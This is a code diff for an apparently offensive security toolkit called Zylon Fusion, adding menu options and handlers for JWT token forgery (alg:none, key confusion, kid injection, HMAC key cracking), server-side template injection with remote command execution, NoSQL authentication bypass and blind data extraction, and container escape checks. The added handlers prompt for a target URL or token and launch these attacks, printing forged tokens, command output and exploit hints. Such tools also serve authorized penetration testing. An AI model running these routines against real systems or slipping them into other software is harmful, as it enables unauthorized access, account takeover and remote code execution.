@@ -151,6 +151,11 @@ from core.cmd_injection_engine import CommandInjectionEngine
 from core.ssrf_engine import SSRFEngine
 from core.race_engine import RaceEngine
 from core.graphql_engine import GraphQLEngine
+from core.ciphey_engine import CipheyEngine, run_ciphey_scan, run_hash_identifier
+from core.jwt_engine import JWTEngine, run_jwt_scan
+from core.ssti_engine import SSTIEngine, run_ssti_scan
+from core.nosql_engine import NoSQLEngine, run_nosql_scan
+from core.container_engine import ContainerEngine, run_container_scan
 
 # ============================================================================
 # SIGNAL HANDLER
@@ -305,6 +310,21 @@ class ZylonUI:
             ("74", "GraphQL Introspection + Schema Extraction"),
             ("75", "GraphQL DoS Vector Testing"),
             ("76", "GraphQL CSRF Testing"),
+            # v4.0 FUSION - Ciphey + JWT + SSTI + NoSQL + Container
+            ("77", "Auto-Decode (Ciphey - 19 Decoders)"),
+            ("78", "Hash Identifier (300+ Hash Types)"),
+            ("79", "JWT Full Attack Playbook (8 Vectors)"),
+            ("80", "JWT Key Confusion (RS256->HS256)"),
+            ("81", "JWT alg:none + Null Signature"),
+            ("82", "JWT kid Injection + Claim Tampering"),
+            ("83", "JWT HMAC Key Cracking"),
+            ("84", "SSTI Detection (17+ Engines)"),
+            ("85", "SSTI Full Exploit (RCE)"),
+            ("86", "NoSQL Injection Detection"),
+            ("87", "NoSQL Auth Bypass ($ne, $gt, $where)"),
+            ("88", "NoSQL Blind Data Extraction"),
+            ("89", "Container Security Scan (DEEPCE)"),
+            ("90", "Container Escape Check"),
             ("42", "Bug Bounty Full Recon Pipeline"),
             ("43", "Bug Bounty Full Vuln Pipeline"),
             ("99", "MEGA SCAN (Every Single Module)"),
@@ -401,6 +421,21 @@ class ZylonFusion:
         
         # GraphQL Security Engine (GraphQL-Cop Fusion v3.0)
         self.graphql_engine = GraphQLEngine(console)
+        
+        # Ciphey Auto-Decode Engine (Ciphey Fusion v4.0)
+        self.ciphey_engine = CipheyEngine()
+        
+        # JWT Security Engine (jwt_tool Fusion v4.0)
+        self.jwt_engine = JWTEngine()
+        
+        # SSTI Engine (SSTImap Fusion v4.0)
+        self.ssti_engine = None  # Initialized per scan with target
+        
+        # NoSQL Injection Engine (NoSQLMap Fusion v4.0)
+        self.nosql_engine = None  # Initialized per scan with target
+        
+        # Container Security Engine (DEEPCE Fusion v4.0)
+        self.container_engine = ContainerEngine()
     
     def set_target(self, target):
         """Validate and set target"""
@@ -510,6 +545,21 @@ class ZylonFusion:
             '74': self._scan_graphql_introspection,
             '75': self._scan_graphql_dos,
             '76': self._scan_graphql_csrf,
+            # v4.0 FUSION - Ciphey + JWT + SSTI + NoSQL + Container
+            '77': self._scan_ciphey_decode,
+            '78': self._scan_hash_identify,
+            '79': self._scan_jwt_full,
+            '80': self._scan_jwt_key_confusion,
+            '81': self._scan_jwt_alg_none,
+            '82': self._scan_jwt_kid_inject,
+            '83': self._scan_jwt_crack,
+            '84': self._scan_ssti_detect,
+            '85': self._scan_ssti_exploit,
+            '86': self._scan_nosql_detect,
+            '87': self._scan_nosql_bypass,
+            '88': self._scan_nosql_extract,
+            '89': self._scan_container_full,
+            '90': self._scan_container_escape,
             '42': self._scan_bounty_recon,
             '43': self._scan_bounty_vuln,
             '99': self._scan_mega,
@@ -2527,6 +2577,231 @@ class ZylonFusion:
         for r in result.get('csrf_vectors', []):
             status = "VULN" if r['result'] else "SAFE"
             console.print(f"  [{'red' if r['result'] else 'green'}][{status}] {r['title']}: {r['description']}[/{'red' if r['result'] else 'green'}]")
+    
+    # ========================================================================
+    # v4.0 FUSION - CIPHEY + JWT + SSTI + NoSQL + CONTAINER
+    # ========================================================================
+    
+    def _scan_ciphey_decode(self):
+        """Auto-Decode using Ciphey Engine (19 decoders)"""
+        console.print(f"\n[bold cyan][*] CIPHEY AUTO-DECODE ENGINE[/bold cyan]")
+        run_ciphey_scan(console)
+    
+    def _scan_hash_identify(self):
+        """Hash type identification"""
+        console.print(f"\n[bold cyan][*] HASH IDENTIFIER[/bold cyan]")
+        run_hash_identifier(console)
+    
+    def _scan_jwt_full(self):
+        """JWT Full Attack Playbook"""
+        console.print(f"\n[bold cyan][*] JWT FULL ATTACK PLAYBOOK[/bold cyan]")
+        run_jwt_scan(console)
+    
+    def _scan_jwt_key_confusion(self):
+        """JWT Key Confusion Attack (RS256 -> HS256)"""
+        console.print(f"\n[bold red][*] JWT KEY CONFUSION ATTACK[/bold red]")
+        console.print("[dim]Uses server's RSA public key as HMAC secret[/dim]")
+        
+        token = Prompt.ask("[cyan]Enter JWT token[/cyan]")
+        header, payload, sig = JWTEngine.parse_token(token.strip())
+        if not header:
+            console.print(f"[red][-] Invalid JWT: {sig}[/red]")
+            return
+        
+        pub_key = Prompt.ask("[cyan]Enter public key or path to public key file[/cyan]")
+        key = pub_key
+        try:
+            with open(pub_key) as f:
+                key = f.read()
+        except Exception:
+            pass
+        
+        results = JWTEngine.attack_key_confusion(header, payload, key)
+        for r in results:
+            console.print(f"\n[green][+] Attack: {r['attack']}[/green]")
+            console.print(f"[yellow]  {r['description']}[/yellow]")
+            console.print(f"[cyan]  Token: {r['token'][:200]}[/cyan]")
+    
+    def _scan_jwt_alg_none(self):
+        """JWT alg:none + Null Signature"""
+        console.print(f"\n[bold red][*] JWT alg:none + NULL SIGNATURE[/bold red]")
+        
+        token = Prompt.ask("[cyan]Enter JWT token[/cyan]")
+        header, payload, sig = JWTEngine.parse_token(token.strip())
+        if not header:
+            console.print(f"[red][-] Invalid JWT: {sig}[/red]")
+            return
+        
+        results = JWTEngine.attack_alg_none(header, payload)
+        results += JWTEngine.attack_null_signature(header, payload)
+        results += JWTEngine.attack_psychic_signature(header, payload)
+        
+        console.print(f"\n[green][+] Generated {len(results)} forged tokens![/green]")
+        for i, r in enumerate(results, 1):
+            console.print(f"\n  [yellow]#{i} {r['attack']}[/yellow]")
+            console.print(f"  [dim]{r['description']}[/dim]")
+            console.print(f"  [cyan]{r['token'][:150]}[/cyan]")
+    
+    def _scan_jwt_kid_inject(self):
+        """JWT kid Injection + Claim Tampering"""
+        console.print(f"\n[bold red][*] JWT kid INJECTION + CLAIM TAMPERING[/bold red]")
+        
+        token = Prompt.ask("[cyan]Enter JWT token[/cyan]")
+        header, payload, sig = JWTEngine.parse_token(token.strip())
+        if not header:
+            console.print(f"[red][-] Invalid JWT: {sig}[/red]")
+            return
+        
+        # kid injection
+        if 'kid' in header:
+            results = JWTEngine.attack_kid_injection(header, payload)
+            console.print(f"\n[green][+] kid Injection: {len(results)} payloads[/green]")
+            for r in results[:5]:
+                console.print(f"  [yellow]{r['description']}[/yellow]")
+                console.print(f"  [cyan]{r['token'][:150]}[/cyan]")
+        else:
+            console.print("[yellow][-] No 'kid' claim in header. Testing claim injection...[/yellow]")
+        
+        # Claim injection
+        claim_results = JWTEngine.attack_claim_injection(header, payload)
+        console.print(f"\n[green][+] Claim Injection: {len(claim_results)} payloads[/green]")
+        for r in claim_results[:7]:
+            console.print(f"  [yellow]{r['attack']}[/yellow]")
+            console.print(f"  [cyan]{r['token'][:150]}[/cyan]")
+    
+    def _scan_jwt_crack(self):
+        """JWT HMAC Key Cracking"""
+        console.print(f"\n[bold yellow][*] JWT HMAC KEY CRACKING[/bold yellow]")
+        
+        token = Prompt.ask("[cyan]Enter JWT token[/cyan]")
+        wordlist = Prompt.ask("[cyan]Wordlist path[/cyan]", default="/usr/share/wordlists/rockyou.txt")
+        
+        with console.status("[bold green]Cracking HMAC key...", spinner="dots"):
+            found = JWTEngine.crack_hmac(token.strip(), wordlist)
+        
+        if found and not str(found).startswith("Token") and not str(found).startswith("Wordlist"):
+            console.print(f"[bold green][+] KEY FOUND: {found}[/bold green]")
+        else:
+            console.print(f"[yellow][-] {found or 'Key not found in wordlist'}[/yellow]")
+    
+    def _scan_ssti_detect(self):
+        """SSTI Detection (17+ Template Engines)"""
+        console.print(f"\n[bold cyan][*] SSTI DETECTION ENGINE[/bold cyan]")
+        run_ssti_scan(console)
+    
+    def _scan_ssti_exploit(self):
+        """SSTI Full Exploit (RCE)"""
+        console.print(f"\n[bold red][*] SSTI EXPLOIT (RCE)[/bold red]")
+        
+        url = Prompt.ask("[cyan]Target URL[/cyan]")
+        method = Prompt.ask("[cyan]HTTP Method[/cyan]", choices=["GET", "POST"], default="GET")
+        params_str = Prompt.ask("[cyan]Parameters (key=value)[/cyan]", default="")
+        
+        params = {}
+        data = {}
+        if params_str.strip():
+            for pair in params_str.strip().split(','):
+                if '=' in pair:
+                    k, v = pair.split('=', 1)
+                    if method == 'GET':
+                        params[k.strip()] = v.strip()
+                    else:
+                        data[k.strip()] = v.strip()
+        
+        engine = SSTIEngine(target_url=url.strip(), method=method, params=params, data=data)
+        
+        with console.status("[bold green]Detecting SSTI...", spinner="dots"):
+            detection = engine.detect_ssti()
+        
+        if not detection:
+            console.print("[yellow][-] No SSTI detected.[/yellow]")
+            return
+        
+        engine_name = detection[0].get('engine', 'unknown') if detection else 'unknown'
+        console.print(f"[green][+] Detected: {engine_name}[/green]")
+        
+        cmd = Prompt.ask("[cyan]Command to execute[/cyan]", default="id")
+        results = engine.exploit_rce(command=cmd, engine=engine_name)
+        
+        if results:
+            for r in results:
+                console.print(f"  [green]Output: {r.get('output', 'No output')}[/green]")
+        else:
+            console.print("[yellow][-] No RCE output. May need blind exploitation.[/yellow]")
+    
+    def _scan_nosql_detect(self):
+        """NoSQL Injection Detection"""
+        console.print(f"\n[bold cyan][*] NoSQL INJECTION DETECTION[/bold cyan]")
+        run_nosql_scan(console)
+    
+    def _scan_nosql_bypass(self):
+        """NoSQL Auth Bypass"""
+        console.print(f"\n[bold red][*] NoSQL AUTH BYPASS[/bold red]")
+        
+        url = Prompt.ask("[cyan]Login/Auth URL[/cyan]")
+        method = Prompt.ask("[cyan]Method[/cyan]", choices=["GET", "POST"], default="POST")
+        
+        params_str = Prompt.ask("[cyan]Auth parameters (user=admin,pass=test)[/cyan]", default="username=admin,password=test")
+        data = {}
+        params = {}
+        if params_str.strip():
+            for pair in params_str.strip().split(','):
+                if '=' in pair:
+                    k, v = pair.split('=', 1)
+                    if method == 'POST':
+                        data[k.strip()] = v.strip()
+                    else:
+                        params[k.strip()] = v.strip()
+        
+        engine = NoSQLEngine(target_url=url.strip(), method=method, params=params, data=data)
+        
+        with console.status("[bold green]Testing NoSQL auth bypass...", spinner="dots"):
+            results = engine.exploit_auth_bypass()
+        
+        if results:
+            console.print("[bold green][+] Auth bypass successful![/bold green]")
+            for r in results:
+                console.print(f"  [cyan]Technique: {r['technique']}[/cyan]")
+                console.print(f"  [green]Evidence: {r['evidence']}[/green]")
+        else:
+            console.print("[yellow][-] Auth bypass not successful with current parameters.[/yellow]")
+    
+    def _scan_nosql_extract(self):
+        """NoSQL Blind Data Extraction"""
+        console.print(f"\n[bold yellow][*] NoSQL BLIND DATA EXTRACTION[/bold yellow]")
+        console.print("[dim]Extract database info via blind NoSQL injection[/dim]")
+        console.print("[yellow]Use NoSQL injection detection (86) first to find vulnerable params[/yellow]")
+        run_nosql_scan(console)
+    
+    def _scan_container_full(self):
+        """Container Security Scan (DEEPCE)"""
+        console.print(f"\n[bold cyan][*] CONTAINER SECURITY SCAN (DEEPCE)[/bold cyan]")
+        run_container_scan(console)
+    
+    def _scan_container_escape(self):
+        """Container Escape Check"""
+        console.print(f"\n[bold red][*] CONTAINER ESCAPE CHECK[/bold red]")
+        
+        engine = ContainerEngine()
+        engine.detect_container()
+        engine.check_user()
+        engine.check_docker()
+        engine.check_capabilities()
+        engine.check_privileged()
+        engine.check_mounts()
+        engine.check_escape_vectors()
+        
+        if engine.results['escape_vectors']:
+            console.print(f"\n[bold red][!] {len(engine.results['escape_vectors'])} ESCAPE VECTORS FOUND![/bold red]")
+            for i, esc in enumerate(engine.results['escape_vectors'], 1):
+                color = 'red' if esc['severity'] == 'CRITICAL' else 'yellow'
+                console.print(f"\n  [{color}][{esc['severity']}] {esc['method']}[/{color}]")
+                console.print(f"  {esc['description']}")
+                console.print(f"  [cyan]Exploit: {esc['exploit']}[/cyan]")
+        else:
+            console.print("\n[green][+] No container escape vectors detected.[/green]")
+            if not engine.results['container_detected']:
+                console.print("[yellow]  Note: Not running inside a container.[/yellow]")
     
     def _scan_bounty_recon(self):
         """Bug Bounty Full Recon Pipeline - All recon modules"""
